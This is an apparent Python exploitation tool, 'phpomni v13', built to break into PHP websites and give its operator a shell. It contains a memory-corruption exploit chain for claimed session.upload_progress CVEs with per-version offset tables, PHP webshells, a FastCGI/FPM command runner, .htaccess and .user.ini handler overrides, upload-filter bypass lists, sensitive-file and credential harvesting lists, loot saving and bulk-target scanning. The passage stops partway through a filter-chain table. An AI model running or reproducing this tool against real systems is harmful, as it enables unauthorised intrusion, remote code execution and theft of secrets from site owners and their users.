#!/usr/bin/env python3
"""
phpomni v13 — find a way into a PHP site, then give you a shell.

Primary target is php2shell: CVE-2026-109618 (mod_php) and CVE-2026-109619
(FPM), pre-auth RCE in session.upload_progress that runs before application
code. Everything else in here is fallback for hosts the gate rejects.

    python3 phpomniv13.py --pwn https://target/
    python3 phpomniv13.py -f sites.txt --pwn --cve-only --threads 12 --json > out.jsonl
    python3 phpomniv13.py --calibrate http://127.0.0.1:8080/ --profiles-out p.json

New in v13:
  * php2shell first: fingerprint -> chain select -> exploit -> fallback ladder
  * persistent connections (Conn) with chunked streaming and worker pinning
  * 109618 mod_php chain: arm, stall past min_freq, reclaim, UAF write
  * 109619 FPM chain: stale BG(unserialize) via pinned worker
  * extended carrier so commands are not capped at 14 bytes
  * layout profile table + --calibrate to generate rows from a lab
  * --cve-only, --force-sapi, --cve-rounds, --cve-long
  * fixed: session_prong never set PHPSESSID, so it could never hit

New in v13.1 (leak channel repair - the pointers were never in the body):
  * cve_leak reads the Set-Cookie PHPSESSID leak (the OOB php_url_encode
    read): one producer+consumer round for the Zend MM chunk base, one for
    the libphp base, using the proven php2shell stage-1/stage-2 grooms
  * system_off is now the real zif_system offset inside libphp (bookworm
    values verified by the public php2shell labs); a dtor anchor validates
    the libphp leak before the forge runs
  * calibrate seeds from the known builds, then sweeps a small window
  * nginx-fronted PHP maps to the FPM chain; --pwn stages the payload

New in v13.1.1 (cookie '+' decode - found via the devploit fork's upstream
fix, docs/upstream-changes.md §3):
  * php_url_encode writes 0x20 as '+', but unquote_to_bytes left it as 0x2B,
    so any leaked pointer containing a 0x20 byte (~1/256 ASLR epochs) decoded
    wrong - the heap vote landed on a consistently-wrong base and the libphp
    base could pass the dtor anchor yet be 0xB000000 off. _cookie_leak now
    folds '+' back to %20 before unquoting (lossless: a real 0x2B byte
    arrives as %2B)
  * the sim now emits real php_url_encode-style cookies and carries 0x20
    bytes in its fake bases, so the E2E runs and self-test cover the '+'
    round-trip (the old quote_from_bytes cookies never contained '+')

New in v13.2 (offset matrix + config-adaptive leak):
  * BUILTIN_PROFILES grew from 3 to 29 rows: 8.4.8-8.4.26 and 8.5.0-8.5.11
    amd64 plus 8.4.25/8.5.10/8.5.11 arm64, ported from the public
    devploit/php2shell calibration matrix (2026-10-30, maintainer-verified
    against the official php:<v>-apache images; the 8.4.26 row is unchanged
    and cross-validates it). The stage-1 groom's forge_len rides the row
    (79 on 8.4.26, 63 on every other build); wrong rows still fail closed at
    the dtor anchor
  * cve_leak learns the real INI from the wire: the OOM fatal names
    memory_limit (so a wrong/missing phpinfo value self-corrects, with an
    8M-32M-128M-512M ladder when no fatal ever fires) and the
    oversized-body warning names post_max_size; a post_max_size that cannot
    fit the OOM body is reported as CONFIG BLOCKED instead of burning blind
    producer rounds (stock post_max_size=8M is the #1 silent killer)
  * sim_target grew --memory-limit/--post-max to model both config killers
  * fixed: --cve-only only short-circuited on SUCCESS - a failed chain
    (e.g. CONFIG BLOCKED) fell through into the full upload/LFI fallback
    ladder; it now means no fallbacks, win or lose
"""
from __future__ import annotations

import argparse
import base64
import binascii
import http.client
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
import traceback
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import StrEnum
from uuid import uuid4

try:
    from rich.console import Console
    from rich.live import Live
    from rich.table import Table
    RICH = True
    CON = Console()
except ImportError:
    RICH = False
    CON = None

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
WID = uuid4().hex[:6]
LFI_MARKER = f"PHPOMNI_{WID}_LFI"
LFI_END = f"PHPOMNI_{WID}_END"
SHELL_MARKER = f"PHPOMNI_{WID}_SHELL"
MAX_BODY = 1 << 20

BANNER = r"""
   __  __         __                            _
  / / / /__  ___ / /____ _  ___  ___ ___  (_)___
 / /_/ / _ \/ _ \/ __/  ' \/ _ \/ _ `/\ \/ / / __/
/ __  /  __/  __/ /_/_/_/_/\___/_//_//_/\_/_/\__/
\/  \/\___/\___/\__/            phpomni v13
"""

EXT_ORDER = [".php", ".php5", ".php7", ".php8", ".pht", ".phtm", ".phar", ".pgif", ".phps", ".shtml"]
NAME_SUFFIX = ["", ".", "%20", "%00.jpg", ".jpg"]
MIME_POLYGLOT = b"GIF89a;\n"

SHELL_DIRS = [
    "/uploads/", "/upload/", "/uploadfiles/", "/files/", "/file/", "/media/",
    "/images/", "/img/", "/assets/", "/static/", "/tmp/", "/temp/", "/data/",
    "/content/", "/storage/", "/public/", "/userfiles/", "/attachments/",
]

FALLBACK_WORDS = [
    "/index.php", "/upload.php", "/upload", "/api/upload", "/elfinder/php/connector.minimal.php",
    "/ckfinder/core/connector/php/connector.php", "/kcfinder/upload.php",
    "/ueditor/php/controller.php?action=config", "/adminer.php", "/filemanager/",
    "/wp-admin/admin-ajax.php", "/graphql", "/api/v1/upload", "/ajax/upload.php",
    "/filemanager/connectors/php/connector.php", "/info.php", "/phpinfo.php", "/test.php",
]

SCAN_SENSITIVE = [
    "/etc/passwd", "/etc/hosts", "/proc/self/cmdline", "/proc/self/environ",
    "/var/log/apache2/access.log", "/var/log/apache/access.log",
    "/var/log/httpd/access_log", "/var/log/nginx/access.log",
    "/usr/local/apache/log/access_log", "/var/log/apache2/error.log",
    "/usr/local/lsws/logs/access.log", "/var/log/lighttpd/access.log",
    "/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf", "/etc/php.ini",
    "/etc/mysql/my.cnf", "/root/.bash_history", "C:/Windows/win.ini",
    "C:/xampp/apache/logs/access.log", "/var/www/html/index.php",
    "/var/www/html/.env", "/.env", "/config.php", "/wp-config.php",
    "/var/lib/php/sessions/sess_x", "/.git/config",
]
LFI_SEEDS = ["file", "page", "path", "inc", "include", "view", "doc", "p", "f", "tpl", "lang",
             "template", "cat"]
DEBUG_LEAK_PARAMS = ["phpinfo", "info", "debug", "test", "env", "diag"]

PHP_EXEC = ("<?php $m='" + SHELL_MARKER + "';if(empty($_REQUEST['c'])){echo $m;exit;}"
            "$c=base64_decode($_REQUEST['c']);"
            "$d=array_map('trim',explode(',',(string)ini_get('disable_functions')));"
            "$f=null;foreach(array('system','shell_exec','passthru','exec','popen') as $n)"
            "{if(function_exists($n)&&!in_array($n,$d)){$f=$n;break;}}"
            "if(!$f){echo 'NOFUNC';exit;}echo '=B=\\n';"
            "if($f==='system'||$f==='passthru'){$f($c);}"
            "elseif($f==='shell_exec'){echo $f($c);}"
            "elseif($f==='exec'){$o=array();$f($c,$o);echo implode(\"\\n\",$o);}"
            "else{$h=$f($c,'r');while(!feof($h)){echo fread($h,4096);}pclose($h);}"
            "echo \"\\n=E=\\n\";?>")

PHP_FPM = r"""<?php
$s=$_GET['s']??'127.0.0.1:9000';$f=$_GET['f']??__FILE__;$c=$_GET['c']??'id';
function r_($t,$d){return chr(1).chr($t).pack('n',1).pack('n',strlen($d)).chr(0).chr(0).$d;}
function nv($k,$v){$e=function($l){return $l<128?chr($l):pack('N',$l|0x80000000);};
 return $e(strlen($k)).$e(strlen($v)).$k.$v;}
$fp=strpos($s,'/')===0?@stream_socket_client("unix://$s",$en,$es,3)
  :@stream_socket_client("tcp://$s",$en,$es,3);
if(!$fp){echo "NOCONN $es";exit;}
$p=nv('GATEWAY_INTERFACE','CGI/1.1').nv('REQUEST_METHOD','GET').nv('SCRIPT_FILENAME',$f)
  .nv('SCRIPT_NAME','/x.php').nv('QUERY_STRING','').nv('REQUEST_URI','/x.php')
  .nv('SERVER_PROTOCOL','HTTP/1.1').nv('SERVER_SOFTWARE','phpomni');
$b='<?php system('.var_export($c,true).');?>';
fwrite($fp,r_(1,pack('n',1).chr(1).str_repeat(chr(0),5)));
fwrite($fp,r_(4,$p.chr(0).chr(0)));
fwrite($fp,r_(5,$b));fwrite($fp,r_(5,''));
stream_set_timeout($fp,6);$o='';
while(!feof($fp)){$x=fread($fp,8192);if($x===false)break;$o.=$x;if(strlen($o)>200000)break;}
echo $o;?>"""

PHP_GLOB = r"""<?php
$t=$_GET['t']??'/';$c=$_GET['c']??'id';$it=@opendir('glob://'.$t.'*');$h=array();
if($it){while(($n=readdir($it))!==false){if($n!=='.'&&$n!=='..')$h[]=$n;}closedir($it);}
echo "GLOB:".implode('|',$h)."\n";
foreach(array('/','/tmp','/var/www','/var/www/html','/home','/opt','/srv') as $d){
 if(@chdir($d)){@ini_set('open_basedir',$d);$o=@shell_exec($c);if($o){echo "AT $d\n$o";break;}}}?>"""

HTACCESS_VARIANTS = (
    b'<FilesMatch "\\.phpomni$">\nSetHandler application/x-httpd-php\n</FilesMatch>\n',
    b"AddType application/x-httpd-php .phpomni\n",
    b"AddHandler application/x-httpd-php .phpomni\n",
    b"AddType application/x-httpd-php .lol\nAddHandler application/x-httpd-php .lol\n",
)
USERINI_VARIANTS = (b"auto_prepend_file=phpomni.php\n", b"auto_append_file=phpomni.php\n")
INTERESTING_KEYS = ("db_pass", "dbpass", "password", "secret", "api_key", "apikey", "token",
                    "app_key", "private")

MULLVAD_NETS = [ipaddress.ip_network(n) for n in (
    "185.65.132.0/22", "185.65.134.0/23", "193.138.218.0/24", "45.83.220.0/22",
    "141.98.252.0/22", "194.242.56.0/22", "146.70.0.0/16", "138.199.0.0/16",
    "169.150.0.0/16", "31.171.0.0/16",
)]

# --- php2shell: CVE-2026-109618 / CVE-2026-109619 / CVE-2026-115560 ----------
# Pre-auth memory corruption inside session.upload_progress, reached from the
# multipart parser before application code runs.
#   109618  mod_php  : OOM -> longjmp skips init_executor -> shutdown on stale
#                      EG() -> stale arData UAF write -> pDestructor -> zif_system
#   109619  FPM      : OOM aborts mid-unserialize -> BG(unserialize) left
#                      dangling at level=1 -> next request on the same worker
#                      reclaims it -> forged session var -> zif_system
#   115560  both     : php_serialize writer read back by the php handler.
#                      NOT closed by 8.2.35/8.3.36/8.4.27/8.5.12.
# Mitigation on every branch is session.upload_progress.enabled=Off.
CVE_FIXED = {"8.5": (5, 12), "8.4": (4, 27), "8.3": (3, 36), "8.2": (2, 35)}
CVE_EOL = ("5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1")
CVE_FIELDS = 1000
SID_COOKIE = "PHPSESSID"
UID_RE = re.compile(r"uid=\d+|root:x:0|Linux |www-data|apache|nginx")
# CVE prong proof: strict identity output only. UID_RE's loose tokens
# (apache/nginx/www-data) match ordinary error pages, which would turn a
# failed forge into a false hard finding.
CVE_PROOF_RE = re.compile(r"uid=\d+|root:x:0:|gid=\d+")
CVE_WRITE_DIRS = ("/tmp", "/dev/shm", "/var/tmp", "/var/www/html/uploads", "/var/www/html")

# builtin layout rows.
#   system_off : offset of zif_system inside libphp - the forge writes
#               libphp_base + system_off into the fake pDestructor slot.
#   dtor       : offset of zval_ptr_dtor inside libphp - anchors and
#               validates the libphp leak (Set-Cookie readback). A row that
#               does not match the target fails HERE, closed - no wrong forge.
#   forge_len  : stage-1 leak groom's forged zend_string length (79 on
#               8.4.26, 63 on every other calibrated build).
#   strval/strlen/zstring/carrier : fake-object geometry inside the
#               reclaim chunk (the extended carrier sizes the chunk to fit
#               the command, so commands are not capped at 14 bytes).
# Matrix source: the public devploit/php2shell calibration (2026-10-30,
# maintainer-verified uid=33 proofs on the official php:<v>-apache images).
# 8.4.26/amd64 predates that port and matches it exactly (independent
# cross-validation). Rows marked RETRY = same class, their RCE re-run was
# pending or their stage-3 sweep exhausted; the 8.5.0-8.5.9 rows needed
# devploit's "vessel" steering, so php-omni's standard carrier there is
# best-effort - recalibrate on a miss. Arm rows key on the phpinfo
# architecture fingerprint ("arm64"). 8.4.25 arm64 is probabilistic:
# keep the default --cve-rounds 3.
_GEO = {"strval": 0x5C0, "strlen": 0x5B8, "zstring": 0x5A8, "carrier": 0x5E0}


def _row(zif: int, dtor: int, flen: int = 63) -> dict:
    return {"system_off": zif, "dtor": dtor, "forge_len": flen, **_GEO}


BUILTIN_PROFILES: dict[str, dict] = {
    # --- PHP 8.4 branch, official bookworm images, amd64 ---
    "8.4.8/amd64": _row(0x43B940, 0x62CD10),      # RETRY (stage-3 sweep exhausted)
    "8.4.10/amd64": _row(0x43B7D0, 0x62CF70),     # verified
    "8.4.11/amd64": _row(0x446CB0, 0x63D2E0),    # verified
    "8.4.12/amd64": _row(0x446CF0, 0x63DC20),    # RETRY (leak re-run pending)
    "8.4.13/amd64": _row(0x445BF0, 0x63CBE0),   # RETRY (stage-3 sweep exhausted)
    "8.4.14/amd64": _row(0x445C30, 0x63D020),    # RETRY (leak re-run pending)
    "8.4.15/amd64": _row(0x445F70, 0x63D420),    # RETRY (leak re-run pending)
    "8.4.16/amd64": _row(0x446930, 0x63DE20),    # RETRY (leak re-run pending)
    "8.4.17/amd64": _row(0x446CB0, 0x63E520),    # RETRY (leak re-run pending)
    "8.4.18/amd64": _row(0x446FF0, 0x63EB20),    # RETRY (leak re-run pending)
    "8.4.19/amd64": _row(0x4472F0, 0x63EFE0),    # verified
    "8.4.20/amd64": _row(0x447530, 0x63F9E0),    # verified
    "8.4.25/amd64": _row(0x464C70, 0x65DC60),    # verified
    "8.4.26/amd64": _row(0x465370, 0x65EB60, 79),  # verified (our own lab proof)
    # --- PHP 8.5 branch, official bookworm images, amd64 ---
    "8.5.0/amd64": _row(0x56A420, 0x781FE0),     # verified (vessel stage 3)
    "8.5.1/amd64": _row(0x56A9A0, 0x7826A0),     # verified (vessel)
    "8.5.2/amd64": _row(0x56BCA0, 0x783DE0),     # verified (vessel)
    "8.5.3/amd64": _row(0x56D1E0, 0x785620),      # verified (vessel)
    "8.5.4/amd64": _row(0x5705E0, 0x788BA0),      # verified (vessel)
    "8.5.5/amd64": _row(0x570DE0, 0x789AE0),     # verified (vessel)
    "8.5.6/amd64": _row(0x595160, 0x7AE6E0),     # verified (vessel)
    "8.5.7/amd64": _row(0x5960E0, 0x7B0460),     # verified (vessel)
    "8.5.8/amd64": _row(0x596620, 0x7B0D60),     # verified (vessel)
    "8.5.9/amd64": _row(0x598160, 0x7B29A0),     # verified (vessel)
    "8.5.10/amd64": _row(0x598D60, 0x7B3860),    # verified (carrier)
    "8.5.11/amd64": _row(0x5996E0, 0x7B47A0),    # verified (carrier)
    # --- arm64 (key = the phpinfo arch fingerprint) ---
    "8.4.25/arm64": _row(0x42FA30, 0x637AE0),    # verified; probabilistic - keep retries
    "8.5.10/arm64": _row(0x52E130, 0x75D360),    # verified (carrier)
    "8.5.11/arm64": _row(0x5314F0, 0x761B80),    # verified (carrier)
}
PROFILES: dict[str, dict] = dict(BUILTIN_PROFILES)

COLOR = False
QUIET = False
LOOT = ""


def _c(txt: str, code: str) -> str:
    return f"\033[{code}m{txt}\033[0m" if COLOR else txt


def say(msg: str = "") -> None:
    if QUIET:
        return
    if RICH:
        CON.print(msg, markup=False, highlight=False)
    else:
        print(msg, flush=True)


def ok(m: str) -> None:
    say(_c("[+] ", "32") + m)


def warn(m: str) -> None:
    say(_c("[!] ", "33") + m)


def bad(m: str) -> None:
    say(_c("[x] ", "31") + m)


def inf(m: str) -> None:
    say(_c("[*] ", "36") + m)


def save_loot(t: "Target", name: str, data: bytes | str) -> None:
    if not LOOT:
        return
    try:
        d = os.path.join(LOOT, re.sub(r"[^\w.\-]", "_", t.host_header()))
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, re.sub(r"[^\w.\-]", "_", name)[:120] or "file")
        with open(p, "wb") as fh:
            fh.write(data if isinstance(data, bytes) else data.encode())
    except OSError:
        pass


class K(StrEnum):
    LEAK = "LEAK"
    EXEC = "EXEC"
    SHELL = "SHELL"
    FAIL = "FAIL"


@dataclass
class Finding:
    kind: K
    prong: str
    detail: str
    hard: bool = False


@dataclass
class Profile:
    os: str = "unknown"
    sapi: str = "unknown"
    php: str = ""
    arch: str = "amd64"
    open_basedir: str = ""
    disable_functions: str = ""
    allow_url_include: bool = False
    allow_url_fopen: bool = True
    file_uploads: bool = True
    session_progress: bool = True
    session_cleanup: bool = True
    serialize_handler: str = "php"
    save_path: str = ""
    docroot: str = ""
    memory_limit: str = ""
    post_max_size: str = ""
    max_input_vars: int = 1000
    min_freq: float = 1.0
    use_strict_mode: bool = True
    fastcgi_buffering: bool = True
    display_errors: bool = True
    leaks: list[str] = field(default_factory=list)


def split_headers(raw: bytes):
    for sep in (b"\r\n\r\n", b"\n\n"):
        if sep in raw:
            head, _, body = raw.partition(sep)
            break
    else:
        head, body = raw, b""
    lines = head.replace(b"\r\n", b"\n").split(b"\n")
    status = 0
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split()[1])
        except (IndexError, ValueError):
            status = 0
        lines = lines[1:]
    hdr: dict[str, str] = {}
    for ln in lines:
        if b":" not in ln:
            continue
        k, _, v = ln.partition(b":")
        hdr[k.decode("latin1").strip().lower()] = v.decode("latin1").strip()
    return status, hdr, body


def read_response(sock: socket.socket, cap: int = MAX_BODY) -> bytes:
    head = b""
    while b"\r\n\r\n" not in head and b"\n\n" not in head and len(head) < (1 << 16):
        chunk = sock.recv(4096)
        if not chunk:
            return head
        head += chunk
    sep = b"\r\n\r\n" if b"\r\n\r\n" in head else b"\n\n"
    head, _, rest = head.partition(sep)
    raw_head = head + sep
    _, headers, _ = split_headers(raw_head)
    body = bytearray(rest)
    if "chunked" in headers.get("transfer-encoding", "").lower():
        while True:
            while b"\r\n" not in body:
                chunk = sock.recv(4096)
                if not chunk:
                    return raw_head + bytes(body)
                body += chunk
            line, _, tail = bytes(body).partition(b"\r\n")
            try:
                size = int(line.split(b";")[0], 16)
            except ValueError:
                return raw_head + bytes(body)
            body = bytearray(tail)
            while len(body) < size + 2:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                body += chunk
            del body[: size + 2]
            if size == 0 or len(body) > cap:
                break
    else:
        clen = headers.get("content-length", "")
        limit = min(int(clen), cap) if clen.isdigit() else cap
        while len(body) < limit:
            chunk = sock.recv(65536)
            if not chunk:
                break
            body += chunk
    return raw_head + bytes(body)


@dataclass
class Response:
    status: int
    headers: dict[str, str]
    body: bytes

    @property
    def text(self) -> str:
        return self.body.decode("latin1", "replace")

    @property
    def ok(self) -> bool:
        return 200 <= self.status < 400

    @property
    def ctype(self) -> str:
        return self.headers.get("content-type", "").lower()


class Target:
    def __init__(self, url: str, *, lhost: str = "", lport: int = 0, timeout: float = 8.0,
                 delay: tuple[float, float] = (0.05, 0.25), retries: int = 1,
                 headers: dict[str, str] | None = None, cookie: str = "",
                 auth: tuple[str, str] | None = None, proxy: str = "",
                 strict_ssl: bool = False):
        p = urllib.parse.urlsplit(url if "//" in url else "http://" + url)
        self.scheme = p.scheme if p.scheme in ("http", "https") else "http"
        self.host = p.hostname or ""
        self.port = p.port or (443 if self.scheme == "https" else 80)
        self.base = p.path or "/"
        if p.query:
            self.base += "?" + p.query
        self.tls = self.scheme == "https"
        self.lhost, self.lport = lhost, lport
        self.timeout, self.delay, self.retries = timeout, delay, retries
        self.headers = dict(headers or {})
        self.cookies: dict[str, str] = {}
        for part in cookie.split(";"):
            if "=" in part:
                k, _, v = part.partition("=")
                self.cookies[k.strip()] = v.strip()
        self.auth = auth
        self.proxy = urllib.parse.urlsplit(proxy) if proxy else None
        self.strict_ssl = strict_ssl
        self.profile = Profile()
        self.findings: list[Finding] = []
        self.handler: dict | None = None
        self.route: tuple[str, str] | None = None
        self.shell_url = ""
        self.sid = uuid4().hex
        self.ext_ok = ""
        self.writable = ""
        self.htaccess_orig: bytes | None = None
        self._lock = threading.Lock()

    def _wrap(self, s: socket.socket) -> socket.socket:
        if not self.tls:
            return s
        ctx = ssl.create_default_context()
        if self.strict_ssl:
            ctx.check_hostname = True
            ctx.verify_mode = ssl.CERT_REQUIRED
        else:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(s, server_hostname=self.host)

    def _connect(self) -> socket.socket:
        if self.proxy:
            return self._connect_proxy()
        return self._wrap(socket.create_connection((self.host, self.port), timeout=self.timeout))

    def _connect_proxy(self) -> socket.socket:
        p = self.proxy
        if p.scheme.startswith("socks"):
            try:
                import socks
            except ImportError:
                raise OSError("PySocks required for socks proxy") from None
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, p.hostname, p.port or 1080)
            s.settimeout(self.timeout)
            s.connect((self.host, self.port))
            return self._wrap(s)
        s = socket.create_connection((p.hostname, p.port or 8080), timeout=self.timeout)
        if self.tls:
            s.sendall(f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                      f"Host: {self.host}:{self.port}\r\n\r\n".encode())
            head = b""
            while b"\r\n\r\n" not in head:
                b = s.recv(4096)
                if not b:
                    raise OSError("proxy CONNECT closed")
                head += b
            if b" 200 " not in head.split(b"\r\n")[0]:
                raise OSError(f"proxy CONNECT failed: {head[:80]!r}")
        return self._wrap(s)

    def host_header(self) -> str:
        h = f"[{self.host}]" if ":" in self.host else self.host
        return h if self.port in (80, 443) else f"{h}:{self.port}"

    def url(self, path: str) -> str:
        return f"{self.scheme}://{self.host_header()}{path}"

    def raw_request(self, method: str, path: str, body: bytes | None = None,
                    extra: dict[str, str] | None = None, read_cap: int = MAX_BODY) -> Response:
        if self.delay[1] > 0:
            time.sleep(random.uniform(*self.delay))
        last: Exception | None = None
        for attempt in range(self.retries + 1):
            try:
                return self._once(method, path, body, extra, read_cap)
            except (OSError, ssl.SSLError) as exc:
                last = exc
                if attempt < self.retries:
                    time.sleep(0.3 * (attempt + 1))
        raise last or OSError("request failed")

    def _once(self, method, path, body, extra, read_cap) -> Response:
        if not path.startswith("/") and "://" not in path:
            path = "/" + path
        wire = f"{self.scheme}://{self.host_header()}{path}" if (self.proxy and not self.tls) else path
        hdrs = {"Host": self.host_header(), "User-Agent": UA, "Accept": "*/*",
                "Accept-Encoding": "identity", "Connection": "close"}
        hdrs.update(self.headers)
        if extra:
            hdrs.update(extra)
        if self.cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if self.auth:
            tok = base64.b64encode(f"{self.auth[0]}:{self.auth[1]}".encode()).decode()
            hdrs["Authorization"] = f"Basic {tok}"
        if isinstance(body, str):
            body = body.encode("latin1")
        if body is not None:
            hdrs["Content-Length"] = str(len(body))
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        packet = ("\r\n".join([f"{method} {wire} HTTP/1.1"] + [f"{k}: {v}" for k, v in hdrs.items()])
                  + "\r\n\r\n").encode("latin1") + (body or b"")
        sock = self._connect()
        try:
            sock.sendall(packet)
            raw = read_response(sock, read_cap)
        finally:
            try:
                sock.close()
            except OSError:
                pass
        st, hdr, bd = split_headers(raw)
        for k, v in hdr.items():
            if k == "set-cookie":
                ck, _, rest = v.partition("=")
                val = rest.split(";")[0]
                # leak cookies (~4KB of urlencoded heap) must not poison the
                # jar - replaying one as a Cookie: header breaks the request
                if len(val) <= 512:
                    self.cookies[ck.strip()] = val
        return Response(st, hdr, bd)

    def get(self, path: str, read_cap: int = MAX_BODY) -> Response:
        return self.raw_request("GET", path, read_cap=read_cap)

    def post(self, body: bytes, ctype: str = "application/x-www-form-urlencoded",
             path: str | None = None, read_cap: int = MAX_BODY) -> Response:
        return self.raw_request("POST", path or self.base, body, {"Content-Type": ctype}, read_cap)

    def get2(self, path: str, read_cap: int = MAX_BODY, follow: int = 3) -> Response:
        r = Response(0, {}, b"")
        for _ in range(follow + 1):
            r = self.get(path, read_cap)
            loc = r.headers.get("location")
            if follow and r.status in (301, 302, 303, 307, 308) and loc:
                sp = urllib.parse.urlsplit(loc)
                if sp.hostname in (None, self.host):
                    path = (sp.path or path) + (("?" + sp.query) if sp.query else "")
                    follow -= 1
                    continue
            break
        return r

    def note(self, f: Finding) -> None:
        with self._lock:
            self.findings.append(f)
            if f.hard and not self.ext_ok:
                self.ext_ok = f.prong

    @property
    def hard(self) -> bool:
        return any(f.hard for f in self.findings)


class Conn:
    """One persistent socket. php2shell needs the stall and the second
    FILE_DATA chunk on the same connection, and the same worker."""

    def __init__(self, t: Target):
        self.t = t
        self.sock = t._connect()
        self.sock.settimeout(t.timeout)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def chunk(self, data: bytes) -> None:
        if data:
            self.sock.sendall(b"%x\r\n" % len(data) + data + b"\r\n")

    def read(self, cap: int = MAX_BODY) -> Response:
        raw = read_response(self.sock, cap)
        st, hdr, bd = split_headers(raw)
        for k, v in hdr.items():
            if k == "set-cookie":
                ck, _, rest = v.partition("=")
                val = rest.split(";")[0]
                # leak cookies (~4KB of urlencoded heap) must not poison the
                # jar - replaying one as a Cookie: header breaks the request
                if len(val) <= 512:
                    self.t.cookies[ck.strip()] = val
        return Response(st, hdr, bd)

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


@dataclass
class Layout:
    """Fake-object geometry, relative to the start of the reclaim chunk."""
    pdestructor: int = 0x38
    ardata: int = 0x18
    numused: int = 0x20
    zstring: int = 0x80
    strlen: int = 0x90
    strval: int = 0x98
    carrier: int = 0xA7
    dtor: int = 0x65EB60
    system_off: int = 0
    forge_len: int = 79
    long: bool = True

    def size_for(self, cmd: str) -> int:
        if not self.long:
            return self.carrier
        return max(self.carrier, self.strval + len(cmd) + 1)

    @property
    def max_cmd(self) -> int:
        return 4096 if self.long else max(1, self.carrier - self.strval - 1)

    @classmethod
    def load(cls, php: str, arch: str, override: str) -> "Layout | None":
        if override:
            try:
                sys_off, val = (int(x, 16) for x in override.replace("0x", "").split(","))
            except ValueError:
                return None
            return cls(system_off=sys_off, strval=val, strlen=val - 8,
                       zstring=val - 0x18, carrier=max(0xA7, val + 0x20))
        row = PROFILES.get(f"{php}/{arch}")
        return cls(**row) if row else None


def build_multipart(fields: list[tuple], boundary: bytes) -> bytes:
    out = bytearray()
    for f in fields:
        out += b"--" + boundary + b"\r\n"
        if len(f) == 2:
            val = f[1] if isinstance(f[1], bytes) else str(f[1]).encode()
            out += f'Content-Disposition: form-data; name="{f[0]}"\r\n\r\n'.encode()
            out += val + b"\r\n"
        else:
            _, fname, data, ctype = f
            out += (f'Content-Disposition: form-data; name="{f[0]}"; filename="{fname}"\r\n'
                    f'Content-Type: {ctype}\r\n\r\n').encode()
            out += data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def q(s: str, safe: str = "") -> str:
    return urllib.parse.quote(s, safe=safe)


def proof_body(text: str, start: str, end: str) -> str:
    if start not in text:
        return ""
    tail = text.split(start, 1)[1]
    if end in tail:
        tail = tail.split(end, 1)[0]
    return tail.strip()[:4000]


_PFX = {
    "0": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "1": ("ISO88597.UTF8", "UTF8.CSISO2022KR"),
    "2": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "3": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "4": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "5": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "6": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "7": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "8": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "9": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "A": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "B": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "C": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "D": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "E": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "F": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "G": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "H": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "I": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "J": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "K": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "L": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "M": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "N": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "O": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "P": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "Q": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "R": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "S": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "T": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "U": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "V": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "W": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "X": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "Y": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "Z": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "a": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "b": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "c": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "d": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "e": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "f": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "g": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "h": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
